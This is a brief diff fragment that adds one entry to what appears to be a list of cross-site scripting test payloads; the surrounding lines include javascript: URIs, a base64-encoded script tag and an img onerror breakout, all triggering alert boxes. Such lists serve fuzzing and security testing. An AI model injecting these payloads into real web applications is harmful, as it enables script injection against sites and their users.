@@ -162,3 +162,4 @@ javascript:alert%28/xss/%29
 javascript:alert(1)
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 x”</title><img src%3dx onerror%3dalert(1)>
+[[#%3Cscript%3Ealert(1)%3C/script%3E|
